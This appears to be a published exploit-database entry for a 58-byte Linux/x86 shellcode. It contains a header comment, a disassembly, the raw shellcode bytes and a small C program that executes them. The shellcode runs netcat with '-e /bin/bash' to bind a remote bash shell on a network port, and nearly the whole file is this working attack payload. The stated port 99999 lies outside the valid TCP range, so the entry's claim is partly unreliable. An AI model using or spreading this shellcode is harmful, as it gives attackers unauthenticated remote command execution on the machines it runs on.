/*
# Exploit Title: Linux/x86 - execve /bin/nc -lp99999 -e /bin/bash shellcode (58 bytes)
# Exploit Description: Binds a TCP bash shell at port 99999 using netcat. Note: This shellcode   uses netcat-traditional package. Otherwise, it will not work.
# Date: 04/11/2018
# Exploit Author: Javier Tello <jtelloal@gmail.com>
# Version: 1.0
# Tested on: i686 GNU/Linux
# Shellcode Length: 58 Bytes


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 6e 2f 6e 63       	push   $0x636e2f6e
 8048068:	68 2f 2f 62 69       	push   $0x69622f2f
 804806d:	89 e3                	mov    %esp,%ebx
 804806f:	50                   	push   %eax
 8048070:	68 62 61 73 68       	push   $0x68736162
 8048075:	68 62 69 6e 2f       	push   $0x2f6e6962
 804807a:	68 2d 65 2f 2f       	push   $0x2f2f652d
 804807f:	89 e2                	mov    %esp,%edx
 8048081:	50                   	push   %eax
 8048082:	68 39 39 39 39       	push   $0x39393939
 8048087:	68 2d 6c 70 39       	push   $0x39706c2d
 804808c:	89 e6                	mov    %esp,%esi
 804808e:	50                   	push   %eax
 804808f:	52                   	push   %edx
 8048090:	56                   	push   %esi
 8048091:	53                   	push   %ebx
 8048092:	89 e1                	mov    %esp,%ecx
 8048094:	89 c2                	mov    %eax,%edx
 8048096:	b0 0b                	mov    $0xb,%al
 8048098:	cd 80                	int    $0x80

===============poc by Javier Tello=========================
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2d\x65\x2f\x2f\x89\xe2\x50\x68\x39\x39\x39\x39\x68\x2d\x6c\x70\x39\x89\xe6\x50\x52\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";

main() {

    printf("Shellcode Length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}